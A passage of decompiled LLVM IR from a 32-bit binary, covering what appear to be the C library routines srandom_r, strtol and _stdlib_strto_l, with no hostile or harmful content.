  %v2_80609dd = add i32 %v1_80609dd, 4
  %v3_80609dd = inttoptr i32 %v2_80609dd to i32*
  store i32 %v0_80609dd, i32* %v3_80609dd, align 4
  br label %dec_label_pc_80609e0

dec_label_pc_80609e0:                             ; preds = %dec_label_pc_806099e, %dec_label_pc_80609db
  %v2_80609e0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80609e0, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80609a9, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_80609e0, { 1, 0 }
  uselistorder label %dec_label_pc_80609db, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_80609e7 = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_80609eb = load i32, i32* @edi, align 4
  %v0_80609ed = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_80609f9 = add i32 %tmp14, 12
  %v2_80609f9 = inttoptr i32 %v1_80609f9 to i32*
  %v3_80609f9 = load i32, i32* %v2_80609f9, align 4
  store i32 %v3_80609f9, i32* %ecx.global-to-local, align 4
  %v6_80609ff = icmp ugt i32 %v3_80609f9, 4
  br i1 %v6_80609ff, label %dec_label_pc_8060a79, label %dec_label_pc_8060a01

dec_label_pc_8060a01:                             ; preds = %entry
  %v1_8060a01 = add i32 %tmp14, 8
  %v2_8060a01 = inttoptr i32 %v1_8060a01 to i32*
  %v3_8060a01 = load i32, i32* %v2_8060a01, align 4
  store i32 %v3_8060a01, i32* %ebx.global-to-local, align 4
  %v1_8060a04 = icmp eq i32 %arg1, 0
  store i32 1, i32* %eax.global-to-local, align 4
  %v3_8060a0b = select i1 %v1_8060a04, i32 1, i32 %arg1
  store i32 %v3_8060a0b, i32* %edx.global-to-local, align 4
  %v1_8060a0e = icmp eq i32 %v3_80609f9, 0
  %v2_8060a10 = inttoptr i32 %v3_8060a01 to i32*
  store i32 %v3_8060a0b, i32* %v2_8060a10, align 4
  br i1 %v1_8060a0e, label %dec_label_pc_8060a77, label %dec_label_pc_8060a14

dec_label_pc_8060a14:                             ; preds = %dec_label_pc_8060a01
  %v0_8060a14 = load i32, i32* @esi, align 4
  %v1_8060a14 = add i32 %v0_8060a14, 16
  %v2_8060a14 = inttoptr i32 %v1_8060a14 to i32*
  %v3_8060a14 = load i32, i32* %v2_8060a14, align 4
  store i32 %v3_8060a14, i32* %eax.global-to-local, align 4
  %v0_8060a17 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8060a17, i32* %ecx.global-to-local, align 4
  store i32 1, i32* @edi, align 4
  %v4_8060a1e = sext i32 %v3_8060a14 to i64
  store i64 %v4_8060a1e, i64* %stack_var_-40, align 8
  %v5_8060a5429 = icmp sgt i32 %v3_8060a14, 1
  br i1 %v5_8060a5429, label %dec_label_pc_8060a23, label %dec_label_pc_8060a56

dec_label_pc_8060a23:                             ; preds = %dec_label_pc_8060a14, %dec_label_pc_8060a23.dec_label_pc_8060a23_crit_edge
  %v0_8060a4b = phi i32 [ %v0_8060a4b.pre, %dec_label_pc_8060a23.dec_label_pc_8060a23_crit_edge ], [ %v0_8060a17, %dec_label_pc_8060a14 ]
  %v0_8060a23 = load i32, i32* %edx.global-to-local, align 4
  %v1_8060a2a = ashr i32 %v0_8060a23, 31
  %v2_8060a2b = zext i32 %v0_8060a23 to i64
  %v4_8060a2b = zext i32 %v1_8060a2a to i64
  %v5_8060a2b = mul nuw i64 %v4_8060a2b, 4294967296
  %v6_8060a2b = or i64 %v5_8060a2b, %v2_8060a2b
  %v8_8060a2b = sdiv i64 %v6_8060a2b, 127773
  %v9_8060a2b = trunc i64 %v8_8060a2b to i32
  %v10_8060a2b = srem i64 %v6_8060a2b, 127773
  %v3_8060a31 = mul nsw i64 %v10_8060a2b, 16807
  %v4_8060a31 = trunc i64 %v3_8060a31 to i32
  %tmp24 = mul i32 %v9_8060a2b, -2836
  %v2_8060a3d = add i32 %v4_8060a31, %tmp24
  %v1_8060a3f = add i32 %v2_8060a3d, 1
  %v6_8060a3f = xor i32 %v2_8060a3d, -2147483648
  %v7_8060a3f = xor i32 %v1_8060a3f, %v2_8060a3d
  %v8_8060a3f = and i32 %v7_8060a3f, %v6_8060a3f
  %v9_8060a3f = icmp slt i32 %v8_8060a3f, 0
  %v10_8060a3f = icmp eq i32 %v1_8060a3f, 0
  %v11_8060a3f = icmp slt i32 %v1_8060a3f, 0
  %v1_8060a42 = add i32 %v2_8060a3d, 2147483647
  store i32 %v1_8060a42, i32* %eax.global-to-local, align 4
  %v3_8060a48 = icmp ne i1 %v11_8060a3f, %v9_8060a3f
  %v4_8060a48 = or i1 %v10_8060a3f, %v3_8060a48
  %v7_8060a48 = select i1 %v4_8060a48, i32 %v1_8060a42, i32 %v2_8060a3d
  store i32 %v7_8060a48, i32* %edx.global-to-local, align 4
  %v1_8060a4b = add i32 %v0_8060a4b, 4
  store i32 %v1_8060a4b, i32* %ecx.global-to-local, align 4
  %v2_8060a4e = inttoptr i32 %v1_8060a4b to i32*
  store i32 %v7_8060a48, i32* %v2_8060a4e, align 4
  %v0_8060a50 = load i32, i32* @edi, align 4
  %v1_8060a50 = add i32 %v0_8060a50, 1
  store i32 %v1_8060a50, i32* @edi, align 4
  %v3_8060a51.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t11 = trunc i64 %v3_8060a51.pre to i32
  %v5_8060a54 = icmp slt i32 %v1_8060a50, %extract.t11
  br i1 %v5_8060a54, label %dec_label_pc_8060a23.dec_label_pc_8060a23_crit_edge, label %dec_label_pc_8060a51.dec_label_pc_8060a56_crit_edge

dec_label_pc_8060a23.dec_label_pc_8060a23_crit_edge: ; preds = %dec_label_pc_8060a23
  %v0_8060a4b.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8060a23

dec_label_pc_8060a51.dec_label_pc_8060a56_crit_edge: ; preds = %dec_label_pc_8060a23
  %v0_8060a56.pre = load i32, i32* @esi, align 4
  %v0_8060a59.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8060a56

dec_label_pc_8060a56:                             ; preds = %dec_label_pc_8060a51.dec_label_pc_8060a56_crit_edge, %dec_label_pc_8060a14
  %v0_8060a59 = phi i32 [ %v0_8060a59.pre, %dec_label_pc_8060a51.dec_label_pc_8060a56_crit_edge ], [ %v0_8060a17, %dec_label_pc_8060a14 ]
  %v0_8060a56 = phi i32 [ %v0_8060a56.pre, %dec_label_pc_8060a51.dec_label_pc_8060a56_crit_edge ], [ %v0_8060a14, %dec_label_pc_8060a14 ]
  %v1_8060a56 = add i32 %v0_8060a56, 20
  %v2_8060a56 = inttoptr i32 %v1_8060a56 to i32*
  %v3_8060a56 = load i32, i32* %v2_8060a56, align 4
  store i32 %v3_8060a56, i32* %eax.global-to-local, align 4
  %v2_8060a59 = add i32 %v0_8060a56, 4
  %v3_8060a59 = inttoptr i32 %v2_8060a59 to i32*
  store i32 %v0_8060a59, i32* %v3_8060a59, align 4
  %v0_8060a5c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8060a5c = load i32, i32* %eax.global-to-local, align 4
  %v2_8060a5c = mul i32 %v1_8060a5c, 4
  %v3_8060a5c = add i32 %v2_8060a5c, %v0_8060a5c
  store i32 %v3_8060a5c, i32* %eax.global-to-local, align 4
  %v1_8060a5f = load i32, i32* @esi, align 4
  %v2_8060a5f = inttoptr i32 %v1_8060a5f to i32*
  store i32 %v3_8060a5c, i32* %v2_8060a5f, align 4
  %v3_8060a61 = load i64, i64* %stack_var_-40, align 8
  %v6_8060a61 = mul nsw i64 %v3_8060a61, 10
  %v7_8060a61 = trunc i64 %v6_8060a61 to i32
  %v2_8060a67 = ptrtoint i32* %stack_var_-20 to i32
  %v1_8060a7425 = add i32 %v7_8060a61, -1
  %v9_8060a7426 = icmp slt i32 %v1_8060a7425, 0
  store i32 %v1_8060a7425, i32* @ebx, align 4
  %v1_8060a7527 = icmp eq i1 %v9_8060a7426, false
  br i1 %v1_8060a7527, label %dec_label_pc_8060a67, label %dec_label_pc_8060a77

dec_label_pc_8060a67:                             ; preds = %dec_label_pc_8060a56, %dec_label_pc_8060a67
  store i32 %v2_8060a67, i32* %eax.global-to-local, align 4
  %v0_8060a6c = load i32, i32* @esi, align 4
  %v2_8060a6d = inttoptr i32 %v0_8060a6c to i32*
  %v3_8060a6d = call i32 @__GI_random_r(i32* %v2_8060a6d, i32 %v2_8060a67)
  store i32 %v0_8060a6c, i32* %eax.global-to-local, align 4
  store i32 %v2_8060a67, i32* %edx.global-to-local, align 4
  %v0_8060a74.pre = load i32, i32* @ebx, align 4
  %v1_8060a74 = add i32 %v0_8060a74.pre, -1
  %v9_8060a74 = icmp slt i32 %v1_8060a74, 0
  store i32 %v1_8060a74, i32* @ebx, align 4
  %v1_8060a75 = icmp eq i1 %v9_8060a74, false
  br i1 %v1_8060a75, label %dec_label_pc_8060a67, label %dec_label_pc_8060a77

dec_label_pc_8060a77:                             ; preds = %dec_label_pc_8060a56, %dec_label_pc_8060a67, %dec_label_pc_8060a01
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8060a79

dec_label_pc_8060a79:                             ; preds = %entry, %dec_label_pc_8060a77
  %v0_8060a80 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_8060a77 ]
  store i32 %v0_80609ed, i32* @ebx, align 4
  store i32 %v0_80609eb, i32* @edi, align 4
  store i32 %v0_80609e7, i32* @ebp, align 4
  ret i32 %v0_8060a80

; uselistorder directives
  uselistorder i32 %v1_8060a74, { 1, 0 }
  uselistorder i32 %v0_8060a56, { 1, 0 }
  uselistorder i32 %v1_8060a3f, { 2, 1, 0 }
  uselistorder i32 %v2_8060a3d, { 3, 4, 0, 2, 1 }
  uselistorder i32 %v0_8060a17, { 1, 0, 2 }
  uselistorder i32 %v3_80609f9, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32 %tmp14, { 0, 2, 1 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder label %dec_label_pc_8060a79, { 1, 0 }
  uselistorder label %dec_label_pc_8060a77, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8060a67, { 1, 0 }
  uselistorder label %dec_label_pc_8060a23, { 1, 0 }
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8060c85 = inttoptr i32 %arg1 to i8*
  %v5_8060c85 = call i32 @_stdlib_strto_l(i8* %v4_8060c85, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_8060c85
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8060caf = load i32, i32* @ebx, align 4
  store i32 %v0_8060caf, i32* %stack_var_-16, align 4
  %v4_8060cb3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8060cb3, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v0_8060cbb = load i32, i32* @global_var_8074fcc, align 4
  store i32 %v0_8060cbb, i32* %edx.global-to-local, align 4
  store i32 %v4_8060cb3, i32* %ebx.global-to-local, align 4
  %v2_8060cc641 = load i8, i8* %arg1, align 1
  %v3_8060cc642 = sext i8 %v2_8060cc641 to i32
  store i32 %v3_8060cc642, i32* %eax.global-to-local, align 4
  %v2_8060cc943 = mul nsw i32 %v3_8060cc642, 2
  %v3_8060cc944 = add i32 %v2_8060cc943, %v0_8060cbb
  %v4_8060cc945 = inttoptr i32 %v3_8060cc944 to i8*
  %v5_8060cc946 = load i8, i8* %v4_8060cc945, align 1
  %v6_8060cc947 = and i8 %v5_8060cc946, 32
  %v7_8060cc948 = icmp eq i8 %v6_8060cc947, 0
  %v1_8060ccd49 = icmp eq i1 %v7_8060cc948, false
  br i1 %v1_8060ccd49, label %dec_label_pc_8060cc5, label %dec_label_pc_8060ccf

dec_label_pc_8060cc5:                             ; preds = %entry, %dec_label_pc_8060cc5
  %v0_8060cc550 = phi i32 [ %v1_8060cc5, %dec_label_pc_8060cc5 ], [ %v4_8060cb3, %entry ]
  %v1_8060cc5 = add i32 %v0_8060cc550, 1
  store i32 %v1_8060cc5, i32* %ebx.global-to-local, align 4
  %v1_8060cc6 = inttoptr i32 %v1_8060cc5 to i8*
  %v2_8060cc6 = load i8, i8* %v1_8060cc6, align 1
  %v3_8060cc6 = sext i8 %v2_8060cc6 to i32
  store i32 %v3_8060cc6, i32* %eax.global-to-local, align 4
  %v2_8060cc9 = mul nsw i32 %v3_8060cc6, 2
  %v3_8060cc9 = add i32 %v2_8060cc9, %v0_8060cbb
  %v4_8060cc9 = inttoptr i32 %v3_8060cc9 to i8*
  %v5_8060cc9 = load i8, i8* %v4_8060cc9, align 1
  %v6_8060cc9 = and i8 %v5_8060cc9, 32
  %v7_8060cc9 = icmp eq i8 %v6_8060cc9, 0
  %v1_8060ccd = icmp eq i1 %v7_8060cc9, false
  br i1 %v1_8060ccd, label %dec_label_pc_8060cc5, label %dec_label_pc_8060ccf

dec_label_pc_8060ccf:                             ; preds = %dec_label_pc_8060cc5, %entry
  %v0_8060cc5.lcssa = phi i32 [ %v4_8060cb3, %entry ], [ %v1_8060cc5, %dec_label_pc_8060cc5 ]
  %v2_8060cc6.lcssa = phi i8 [ %v2_8060cc641, %entry ], [ %v2_8060cc6, %dec_label_pc_8060cc5 ]
  %v3_8060cc6.lcssa = phi i32 [ %v3_8060cc642, %entry ], [ %v3_8060cc6, %dec_label_pc_8060cc5 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_8060ccf = icmp eq i8 %v2_8060cc6.lcssa, 43
  br i1 %v9_8060ccf, label %dec_label_pc_8060cea, label %dec_label_pc_8060cd4

dec_label_pc_8060cd4:                             ; preds = %dec_label_pc_8060ccf
  %v9_8060cd4 = icmp eq i8 %v2_8060cc6.lcssa, 45
  %v1_8060cdc = icmp eq i1 %v9_8060cd4, false
  br i1 %v1_8060cdc, label %dec_label_pc_8060ceb, label %dec_label_pc_8060cea

dec_label_pc_8060cea:                             ; preds = %dec_label_pc_8060ccf, %dec_label_pc_8060cd4
  %storemerge5 = phi i8 [ 1, %dec_label_pc_8060cd4 ], [ 0, %dec_label_pc_8060ccf ]
  %v1_8060cea = add i32 %v0_8060cc5.lcssa, 1
  store i32 %v1_8060cea, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8060ceb

dec_label_pc_8060ceb:                             ; preds = %dec_label_pc_8060cd4, %dec_label_pc_8060cea
  %v0_8060cfd = phi i32 [ %v1_8060cea, %dec_label_pc_8060cea ], [ %v0_8060cc5.lcssa, %dec_label_pc_8060cd4 ]
  %stack_var_-18.0 = phi i8 [ %storemerge5, %dec_label_pc_8060cea ], [ 0, %dec_label_pc_8060cd4 ]
  %v1_8060ceb = and i32 %arg3, -17
  %v2_8060ceb = icmp eq i32 %v1_8060ceb, 0
  %v1_8060cf3 = icmp eq i1 %v2_8060ceb, false
  br i1 %v1_8060cf3, label %dec_label_pc_8060d19, label %dec_label_pc_8060cf5

dec_label_pc_8060cf5:                             ; preds = %dec_label_pc_8060ceb
  %v1_8060cf5 = add i32 %arg3, 10
  store i32 %v1_8060cf5, i32* %esi.global-to-local, align 4
  %v1_8060cf8 = inttoptr i32 %v0_8060cfd to i8*
  %v2_8060cf8 = load i8, i8* %v1_8060cf8, align 1
  %v8_8060cf8 = icmp eq i8 %v2_8060cf8, 48
  %v1_8060cfb = icmp eq i1 %v8_8060cf8, false
  br i1 %v1_8060cfb, label %dec_label_pc_8060d0e, label %dec_label_pc_8060cfd

dec_label_pc_8060cfd:                             ; preds = %dec_label_pc_8060cf5
  %v1_8060cfd = add i32 %v0_8060cfd, 1
  store i32 %v1_8060cfd, i32* %ebx.global-to-local, align 4
  %v1_8060cfe = add i32 %arg3, 8
  store i32 %v1_8060cfe, i32* %esi.global-to-local, align 4
  %v1_8060d01 = inttoptr i32 %v1_8060cfd to i8*
  %v2_8060d01 = load i8, i8* %v1_8060d01, align 1
  %v2_8060d05 = or i8 %v2_8060d01, 32
  %v7_8060d05 = zext i8 %v2_8060d05 to i32
  %v9_8060d05 = and i32 %v3_8060cc6.lcssa, -256
  %v10_8060d05 = or i32 %v7_8060d05, %v9_8060d05
  store i32 %v10_8060d05, i32* %eax.global-to-local, align 4
  %v10_8060d07 = icmp eq i8 %v2_8060d05, 120
  %v1_8060d09 = icmp eq i1 %v10_8060d07, false
  br i1 %v1_8060d09, label %dec_label_pc_8060d0e, label %dec_label_pc_8060d0b

dec_label_pc_8060d0b:                             ; preds = %dec_label_pc_8060cfd
  %v2_8060d0b = mul i32 %v1_8060cfe, 2
  store i32 %v2_8060d0b, i32* %esi.global-to-local, align 4
  %v1_8060d0d = add i32 %v0_8060cfd, 2
  store i32 %v1_8060d0d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8060d0e

dec_label_pc_8060d0e:                             ; preds = %dec_label_pc_8060cfd, %dec_label_pc_8060cf5, %dec_label_pc_8060d0b
  %v0_8060d3613 = phi i32 [ %v1_8060cfd, %dec_label_pc_8060cfd ], [ %v0_8060cfd, %dec_label_pc_8060cf5 ], [ %v1_8060d0d, %dec_label_pc_8060d0b ]
  %v0_8060d9022 = phi i32 [ %v1_8060cfd, %dec_label_pc_8060cfd ], [ %v4_8060cb3, %dec_label_pc_8060cf5 ], [ %v1_8060cfd, %dec_label_pc_8060d0b ]
  %v3_8060d16 = phi i32 [ %v1_8060cfe, %dec_label_pc_8060cfd ], [ %v1_8060cf5, %dec_label_pc_8060cf5 ], [ %v2_8060d0b, %dec_label_pc_8060d0b ]
  %v1_8060d0e = add i32 %v3_8060d16, -17
  %v6_8060d0e = sub i32 16, %v3_8060d16
  %v7_8060d0e = and i32 %v6_8060d0e, %v3_8060d16
  %v8_8060d0e = icmp slt i32 %v7_8060d0e, 0
  %v10_8060d0e = icmp slt i32 %v1_8060d0e, 0
  store i32 16, i32* %eax.global-to-local, align 4
  %v2_8060d16 = icmp eq i1 %v10_8060d0e, %v8_8060d0e
  %v5_8060d16 = select i1 %v2_8060d16, i32 16, i32 %v3_8060d16
  store i32 %v5_8060d16, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8060d19

dec_label_pc_8060d19:                             ; preds = %dec_label_pc_8060ceb, %dec_label_pc_8060d0e
  %v0_8060d9023 = phi i32 [ %v4_8060cb3, %dec_label_pc_8060ceb ], [ %v0_8060d9022, %dec_label_pc_8060d0e ]
  %v0_8060d3612 = phi i32 [ %v0_8060cfd, %dec_label_pc_8060ceb ], [ %v0_8060d3613, %dec_label_pc_8060d0e ]
  %v0_8060d28 = phi i32 [ %arg3, %dec_label_pc_8060ceb ], [ %v5_8060d16, %dec_label_pc_8060d0e ]
  %v1_8060d19 = add i32 %v0_8060d28, -2
  store i32 %v1_8060d19, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8060d21 = icmp ugt i32 %v1_8060d19, 34
  br i1 %v6_8060d21, label %dec_label_pc_8060d85, label %dec_label_pc_8060d23

dec_label_pc_8060d23:                             ; preds = %dec_label_pc_8060d19
  %div = udiv i32 -1, %v0_8060d28
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp38 = urem i32 -1, %v0_8060d28
  %v1_8060d2a = trunc i32 %tmp38 to i8
  store i32 %div, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_8060d63 = urem i32 %arg4, 256
  br label %dec_label_pc_8060d36

dec_label_pc_8060d34:                             ; preds = %dec_label_pc_8060d7b, %dec_label_pc_8060d63
  %v2_8060d38.pre = phi i32 [ %v0_8060d7e, %dec_label_pc_8060d7b ], [ %v2_8060d38.pre.pre, %dec_label_pc_8060d63 ]
  %v4_8060d36.pre = phi i32 [ %v1_8060d4f, %dec_label_pc_8060d7b ], [ %v4_8060d36.pre.pre, %dec_label_pc_8060d63 ]
  %v0_8060d34 = phi i32 [ %v1_8060d56, %dec_label_pc_8060d7b ], [ %v0_8060d34.pre, %dec_label_pc_8060d63 ]
  %stack_var_-18.1 = phi i8 [ %stack_var_-18.2, %dec_label_pc_8060d7b ], [ %v6_8060d67, %dec_label_pc_8060d63 ]
  br label %dec_label_pc_8060d36

dec_label_pc_8060d36:                             ; preds = %dec_label_pc_8060d23, %dec_label_pc_8060d34
  %v0_8060d9021 = phi i32 [ %v0_8060d9023, %dec_label_pc_8060d23 ], [ %v0_8060d34, %dec_label_pc_8060d34 ]
  %v0_8060d56 = phi i32 [ %v0_8060d3612, %dec_label_pc_8060d23 ], [ %v0_8060d34, %dec_label_pc_8060d34 ]
  %v2_8060d38 = phi i32 [ %v4_8060cb3, %dec_label_pc_8060d23 ], [ %v2_8060d38.pre, %dec_label_pc_8060d34 ]
  %v4_8060d36 = phi i32 [ %div, %dec_label_pc_8060d23 ], [ %v4_8060d36.pre, %dec_label_pc_8060d34 ]
  %stack_var_-18.2 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8060d23 ], [ %stack_var_-18.1, %dec_label_pc_8060d34 ]
  %v1_8060d36 = inttoptr i32 %v0_8060d56 to i8*
  %v2_8060d36 = load i8, i8* %v1_8060d36, align 1
  %v3_8060d36 = zext i8 %v2_8060d36 to i32
  %v5_8060d36 = and i32 %v4_8060d36, -256
  %v6_8060d36 = or i32 %v3_8060d36, %v5_8060d36
  store i32 %v6_8060d36, i32* %eax.global-to-local, align 4
  %v2_8060d3a = add i8 %v2_8060d36, -48
  %v12_8060d3a = zext i8 %v2_8060d3a to i32
  %v14_8060d3a = and i32 %v2_8060d38, -256
  %v15_8060d3a = or i32 %v12_8060d3a, %v14_8060d3a
  store i32 %v15_8060d3a, i32* @ecx, align 4
  %tmp = icmp ult i8 %v2_8060d3a, 10
  br i1 %tmp, label %dec_label_pc_8060d4f, label %dec_label_pc_8060d42

dec_label_pc_8060d42:                             ; preds = %dec_label_pc_8060d36
  %v2_8060d42 = or i8 %v2_8060d36, 32
  %v7_8060d42 = zext i8 %v2_8060d42 to i32
  %v10_8060d42 = or i32 %v7_8060d42, %v5_8060d36
  store i32 %v10_8060d42, i32* %eax.global-to-local, align 4
  %v2_8060d44 = or i32 %v14_8060d3a, 40
  store i32 %v2_8060d44, i32* @ecx, align 4
  %tmp55 = icmp ult i8 %v2_8060d42, 97
  br i1 %tmp55, label %dec_label_pc_8060d4f, label %dec_label_pc_8060d4a

dec_label_pc_8060d4a:                             ; preds = %dec_label_pc_8060d42
  %v2_8060d4c = add i8 %v2_8060d42, -87
  %v15_8060d4c = zext i8 %v2_8060d4c to i32
  %v18_8060d4c = or i32 %v15_8060d4c, %v14_8060d3a
  store i32 %v18_8060d4c, i32* @ecx, align 4
  br label %dec_label_pc_8060d4f

dec_label_pc_8060d4f:                             ; preds = %dec_label_pc_8060d42, %dec_label_pc_8060d36, %dec_label_pc_8060d4a
  %v0_8060d7e = phi i32 [ %v2_8060d44, %dec_label_pc_8060d42 ], [ %v15_8060d3a, %dec_label_pc_8060d36 ], [ %v18_8060d4c, %dec_label_pc_8060d4a ]
  %v1_8060d4f = urem i32 %v0_8060d7e, 256
  store i32 %v1_8060d4f, i32* %eax.global-to-local, align 4
  %v1_8060d52 = load i32, i32* %esi.global-to-local, align 4
  %v2_8060d52 = sub i32 %v1_8060d4f, %v1_8060d52
  %v10_8060d52 = and i32 %v2_8060d52, %v1_8060d52
  %v11_8060d52 = icmp slt i32 %v10_8060d52, 0
  %v13_8060d52 = icmp slt i32 %v2_8060d52, 0
  %v2_8060d54 = icmp eq i1 %v13_8060d52, %v11_8060d52
  br i1 %v2_8060d54, label %dec_label_pc_8060d85, label %dec_label_pc_8060d56

dec_label_pc_8060d56:                             ; preds = %dec_label_pc_8060d4f
  %v1_8060d56 = add i32 %v0_8060d56, 1
  store i32 %v1_8060d56, i32* %ebx.global-to-local, align 4
  %v0_8060d57 = load i32, i32* %edx.global-to-local, align 4
  %v1_8060d57 = load i32, i32* %ebp.global-to-local, align 4
  %tmp56 = icmp ugt i32 %v0_8060d57, %v1_8060d57
  br i1 %tmp56, label %dec_label_pc_8060d63, label %dec_label_pc_8060d5b

dec_label_pc_8060d5b:                             ; preds = %dec_label_pc_8060d56
  %v12_8060d57 = icmp eq i32 %v0_8060d57, %v1_8060d57
  %v1_8060d5b = icmp eq i1 %v12_8060d57, false
  br i1 %v1_8060d5b, label %dec_label_pc_8060d7b, label %dec_label_pc_8060d5d

dec_label_pc_8060d5d:                             ; preds = %dec_label_pc_8060d5b
  %v1_8060d5d = trunc i32 %v0_8060d7e to i8
  %tmp57 = icmp ugt i8 %v1_8060d5d, %v1_8060d2a
  br i1 %tmp57, label %dec_label_pc_8060d63, label %dec_label_pc_8060d7b

dec_label_pc_8060d63:                             ; preds = %dec_label_pc_8060d5d, %dec_label_pc_8060d56
  store i32 %v4_8060d63, i32* %eax.global-to-local, align 4
  %v6_8060d67 = and i8 %stack_var_-18.2, %tmp37
  %v1_8060d6b = sext i8 %v6_8060d67 to i32
  %v2_8060d6b = call i32 @__errno_location(i32 %v1_8060d6b)
  store i32 %v2_8060d6b, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8060d73 = inttoptr i32 %v2_8060d6b to i32*
  store i32 34, i32* %v1_8060d73, align 4
  %v0_8060d34.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8060d36.pre.pre = load i32, i32* %eax.global-to-local, align 4
  %v2_8060d38.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8060d34

dec_label_pc_8060d7b:                             ; preds = %dec_label_pc_8060d5d, %dec_label_pc_8060d5b
  %v4_8060d7b = mul i32 %v0_8060d57, %v1_8060d52
  store i32 %v1_8060d4f, i32* %eax.global-to-local, align 4
  %v2_8060d81 = add i32 %v4_8060d7b, %v1_8060d4f
  store i32 %v2_8060d81, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8060d34

dec_label_pc_8060d85:                             ; preds = %dec_label_pc_8060d4f, %dec_label_pc_8060d19
  %v0_8060d90 = phi i32 [ %v0_8060d9023, %dec_label_pc_8060d19 ], [ %v0_8060d9021, %dec_label_pc_8060d4f ]
  %stack_var_-18.3 = phi i8 [ %stack_var_-18.0, %dec_label_pc_8060d19 ], [ %stack_var_-18.2, %dec_label_pc_8060d4f ]
  %v4_8060d85 = icmp eq i32 %arg2, 0
  br i1 %v4_8060d85, label %dec_label_pc_8060d92, label %dec_label_pc_8060d8c

dec_label_pc_8060d8c:                             ; preds = %dec_label_pc_8060d85
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8060d90 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8060d90, i32* %v2_8060d90, align 4
  br label %dec_label_pc_8060d92

dec_label_pc_8060d92:                             ; preds = %dec_label_pc_8060d85, %dec_label_pc_8060d8c
  %v8_8060d92 = icmp eq i8 %stack_var_-18.3, 0
  %v2_8060d97 = zext i1 %v8_8060d92 to i32
  %v13_8060d97 = icmp eq i1 %v8_8060d92, false
  %v1_8060d993 = or i32 %v2_8060d97, -2147483648
  store i32 %v1_8060d993, i32* %ebx.global-to-local, align 4
  %v5_8060d9f = icmp eq i8 %tmp37, 0
  br i1 %v5_8060d9f, label %dec_label_pc_8060db7, label %dec_label_pc_8060da6

dec_label_pc_8060da6:                             ; preds = %dec_label_pc_8060d92
  %v0_8060da6 = load i32, i32* %edx.global-to-local, align 4
  %tmp58 = icmp ugt i32 %v0_8060da6, %v1_8060d993
  br i1 %tmp58, label %dec_label_pc_8060daa, label %dec_label_pc_8060db7

dec_label_pc_8060daa:                             ; preds = %dec_label_pc_8060da6
  %v1_8060daa = sext i8 %stack_var_-18.3 to i32
  %v2_8060daa = call i32 @__errno_location(i32 %v1_8060daa)
  store i32 %v2_8060daa, i32* %eax.global-to-local, align 4
  %v0_8060daf = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8060daf, i32* %edx.global-to-local, align 4
  %v1_8060db1 = inttoptr i32 %v2_8060daa to i32*
  store i32 34, i32* %v1_8060db1, align 4
  br label %dec_label_pc_8060db7

dec_label_pc_8060db7:                             ; preds = %dec_label_pc_8060da6, %dec_label_pc_8060d92, %dec_label_pc_8060daa
  %v0_8060db7 = load i32, i32* %edx.global-to-local, align 4
  %v1_8060db9 = sub i32 0, %v0_8060db7
  %v4_8060dc0 = select i1 %v13_8060d97, i32 %v1_8060db9, i32 %v0_8060db7
  store i32 %v4_8060dc0, i32* %edx.global-to-local, align 4
  %v2_8060dc6 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8060dc6, i32* @ebx, align 4
  store i32 %v4_8060dc0, i32* %eax.global-to-local, align 4
